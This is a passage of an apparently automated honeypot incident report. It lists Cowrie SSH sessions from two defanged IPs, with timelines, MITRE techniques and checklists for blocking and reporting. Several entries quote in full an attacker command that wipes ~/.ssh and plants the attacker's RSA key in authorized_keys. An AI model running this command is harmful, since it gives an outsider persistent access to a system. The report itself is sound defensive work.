
**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:42:23` | `cowrie.session.connect` |
| `2026-04-06 06:42:23` | `cowrie.client.version` |
| `2026-04-06 06:42:23` | `cowrie.client.kex` |
| `2026-04-06 06:42:24` | `cowrie.login.success` |
| `2026-04-06 06:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473de610ce0a

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:42 |
| **Last Seen** | 2026-04-06 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:42:48` | `cowrie.session.connect` |
| `2026-04-06 06:42:48` | `cowrie.client.version` |
| `2026-04-06 06:42:48` | `cowrie.client.kex` |
| `2026-04-06 06:42:48` | `cowrie.login.success` |
| `2026-04-06 06:42:48` | `cowrie.session.params` |
| `2026-04-06 06:42:48` | `cowrie.command.input` |
| `2026-04-06 06:42:48` | `cowrie.command.failed` |
| `2026-04-06 06:42:48` | `cowrie.log.closed` |
| `2026-04-06 06:42:48` | `cowrie.session.params` |
| `2026-04-06 06:42:48` | `cowrie.command.input` |
| `2026-04-06 06:42:48` | `cowrie.session.file_download` |
| `2026-04-06 06:42:48` | `cowrie.log.closed` |
| `2026-04-06 06:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d89d22fe6f0f

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:42 |
| **Last Seen** | 2026-04-06 06:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:42:49` | `cowrie.session.connect` |
| `2026-04-06 06:42:49` | `cowrie.client.version` |
| `2026-04-06 06:42:49` | `cowrie.client.kex` |
| `2026-04-06 06:42:49` | `cowrie.login.success` |
| `2026-04-06 06:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c913c2d25e12

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:44 |
| **Last Seen** | 2026-04-06 06:49 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:44:29` | `cowrie.session.connect` |
| `2026-04-06 06:44:29` | `cowrie.client.version` |
| `2026-04-06 06:44:29` | `cowrie.client.kex` |
| `2026-04-06 06:44:31` | `cowrie.login.success` |
| `2026-04-06 06:44:31` | `cowrie.session.params` |
| `2026-04-06 06:44:31` | `cowrie.command.input` |
| `2026-04-06 06:44:31` | `cowrie.command.failed` |
| `2026-04-06 06:44:32` | `cowrie.log.closed` |
| `2026-04-06 06:44:32` | `cowrie.session.params` |
| `2026-04-06 06:44:32` | `cowrie.command.input` |
| `2026-04-06 06:44:33` | `cowrie.session.file_download` |
| `2026-04-06 06:44:33` | `cowrie.log.closed` |
| `2026-04-06 06:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35615ec512e

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:44 |
| **Last Seen** | 2026-04-06 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:44:36` | `cowrie.session.connect` |
| `2026-04-06 06:44:36` | `cowrie.client.version` |
| `2026-04-06 06:44:37` | `cowrie.client.kex` |
| `2026-04-06 06:44:38` | `cowrie.login.success` |
| `2026-04-06 06:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19602c2dd1ca

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:45 |
| **Last Seen** | 2026-04-06 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:45:53` | `cowrie.session.connect` |
| `2026-04-06 06:45:53` | `cowrie.client.version` |
| `2026-04-06 06:45:53` | `cowrie.client.kex` |
| `2026-04-06 06:45:53` | `cowrie.login.success` |
| `2026-04-06 06:45:53` | `cowrie.session.params` |
| `2026-04-06 06:45:53` | `cowrie.command.input` |
| `2026-04-06 06:45:53` | `cowrie.command.failed` |
| `2026-04-06 06:45:53` | `cowrie.log.closed` |
| `2026-04-06 06:45:53` | `cowrie.session.params` |
| `2026-04-06 06:45:53` | `cowrie.command.input` |
| `2026-04-06 06:45:53` | `cowrie.session.file_download` |
| `2026-04-06 06:45:53` | `cowrie.log.closed` |
| `2026-04-06 06:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801e65e092cf

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:45 |
| **Last Seen** | 2026-04-06 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:45:54` | `cowrie.session.connect` |
| `2026-04-06 06:45:54` | `cowrie.client.version` |
| `2026-04-06 06:45:54` | `cowrie.client.kex` |
| `2026-04-06 06:45:54` | `cowrie.login.success` |
| `2026-04-06 06:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f7c9629b83

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:46 |
| **Last Seen** | 2026-04-06 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:46:58` | `cowrie.session.connect` |
| `2026-04-06 06:46:58` | `cowrie.client.version` |
| `2026-04-06 06:46:58` | `cowrie.client.kex` |
| `2026-04-06 06:46:58` | `cowrie.login.success` |
| `2026-04-06 06:46:58` | `cowrie.session.params` |
| `2026-04-06 06:46:58` | `cowrie.command.input` |
| `2026-04-06 06:46:58` | `cowrie.command.failed` |
| `2026-04-06 06:46:58` | `cowrie.log.closed` |
| `2026-04-06 06:46:58` | `cowrie.session.params` |
| `2026-04-06 06:46:58` | `cowrie.command.input` |
| `2026-04-06 06:46:58` | `cowrie.session.file_download` |
| `2026-04-06 06:46:58` | `cowrie.log.closed` |
| `2026-04-06 06:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa74e2db92c8

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:46 |
| **Last Seen** | 2026-04-06 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:46:59` | `cowrie.session.connect` |
| `2026-04-06 06:46:59` | `cowrie.client.version` |
| `2026-04-06 06:46:59` | `cowrie.client.kex` |
| `2026-04-06 06:46:59` | `cowrie.login.success` |
| `2026-04-06 06:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f28fd5c1284

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:49 |
| **Last Seen** | 2026-04-06 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:49:08` | `cowrie.session.connect` |
| `2026-04-06 06:49:08` | `cowrie.client.version` |
| `2026-04-06 06:49:08` | `cowrie.client.kex` |
| `2026-04-06 06:49:08` | `cowrie.login.success` |
| `2026-04-06 06:49:08` | `cowrie.session.params` |
| `2026-04-06 06:49:08` | `cowrie.command.input` |
| `2026-04-06 06:49:08` | `cowrie.command.failed` |
| `2026-04-06 06:49:08` | `cowrie.log.closed` |
| `2026-04-06 06:49:08` | `cowrie.session.params` |
| `2026-04-06 06:49:08` | `cowrie.command.input` |
| `2026-04-06 06:49:08` | `cowrie.session.file_download` |
| `2026-04-06 06:49:08` | `cowrie.log.closed` |
| `2026-04-06 06:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b66ae9694cb2

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:49 |
| **Last Seen** | 2026-04-06 06:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:49:09` | `cowrie.session.connect` |
| `2026-04-06 06:49:09` | `cowrie.client.version` |
| `2026-04-06 06:49:09` | `cowrie.client.kex` |
| `2026-04-06 06:49:10` | `cowrie.login.success` |
| `2026-04-06 06:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f76201f85b77

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:50 |
| **Last Seen** | 2026-04-06 06:55 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:50:03` | `cowrie.session.connect` |
| `2026-04-06 06:50:03` | `cowrie.client.version` |
| `2026-04-06 06:50:03` | `cowrie.client.kex` |
| `2026-04-06 06:50:04` | `cowrie.login.success` |
| `2026-04-06 06:50:05` | `cowrie.session.params` |
| `2026-04-06 06:50:05` | `cowrie.command.input` |
| `2026-04-06 06:50:05` | `cowrie.command.failed` |
| `2026-04-06 06:50:06` | `cowrie.log.closed` |
| `2026-04-06 06:50:06` | `cowrie.session.params` |
| `2026-04-06 06:50:06` | `cowrie.command.input` |
| `2026-04-06 06:50:07` | `cowrie.session.file_download` |
| `2026-04-06 06:50:07` | `cowrie.log.closed` |
| `2026-04-06 06:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-915a93f514d2

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:50 |
| **Last Seen** | 2026-04-06 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:50:10` | `cowrie.session.connect` |
| `2026-04-06 06:50:10` | `cowrie.client.version` |
| `2026-04-06 06:50:11` | `cowrie.client.kex` |
| `2026-04-06 06:50:12` | `cowrie.login.success` |
| `2026-04-06 06:50:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fffbc0b10da8

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:50 |
| **Last Seen** | 2026-04-06 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:50:13` | `cowrie.session.connect` |
| `2026-04-06 06:50:13` | `cowrie.client.version` |
| `2026-04-06 06:50:13` | `cowrie.client.kex` |
| `2026-04-06 06:50:13` | `cowrie.login.success` |
| `2026-04-06 06:50:13` | `cowrie.session.params` |
| `2026-04-06 06:50:13` | `cowrie.command.input` |
| `2026-04-06 06:50:13` | `cowrie.command.failed` |
| `2026-04-06 06:50:13` | `cowrie.log.closed` |
| `2026-04-06 06:50:13` | `cowrie.session.params` |
| `2026-04-06 06:50:13` | `cowrie.command.input` |
| `2026-04-06 06:50:13` | `cowrie.session.file_download` |
| `2026-04-06 06:50:13` | `cowrie.log.closed` |
| `2026-04-06 06:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f39a4ff714b0

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-04-06 06:50 |
| **Last Seen** | 2026-04-06 06:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:50:14` | `cowrie.session.connect` |
| `2026-04-06 06:50:14` | `cowrie.client.version` |
| `2026-04-06 06:50:14` | `cowrie.client.kex` |
| `2026-04-06 06:50:14` | `cowrie.login.success` |
| `2026-04-06 06:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b0e296af2f

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:51 |
| **Last Seen** | 2026-04-06 06:56 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:51:08` | `cowrie.session.connect` |
| `2026-04-06 06:51:08` | `cowrie.client.version` |
| `2026-04-06 06:51:08` | `cowrie.client.kex` |
| `2026-04-06 06:51:09` | `cowrie.login.success` |
| `2026-04-06 06:51:10` | `cowrie.session.params` |
| `2026-04-06 06:51:10` | `cowrie.command.input` |
| `2026-04-06 06:51:10` | `cowrie.command.failed` |
| `2026-04-06 06:51:10` | `cowrie.log.closed` |
| `2026-04-06 06:51:11` | `cowrie.session.params` |
| `2026-04-06 06:51:11` | `cowrie.command.input` |
| `2026-04-06 06:51:11` | `cowrie.session.file_download` |
| `2026-04-06 06:51:11` | `cowrie.log.closed` |
| `2026-04-06 06:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c2de1390f5

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:51 |
| **Last Seen** | 2026-04-06 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 06:51:16` | `cowrie.session.connect` |
| `2026-04-06 06:51:16` | `cowrie.client.version` |
| `2026-04-06 06:51:17` | `cowrie.client.kex` |
| `2026-04-06 06:51:18` | `cowrie.login.success` |
| `2026-04-06 06:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.53[.]142` to AbuseIPDB if not already reported
- [ ] Block `138.84.53[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57004b4de7fb

| Field | Detail |
|---|---|
| **Source IP** | `138.84.53[.]142` |
| **First Seen** | 2026-04-06 06:54 |
| **Last Seen** | 2026-04-06 06:59 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
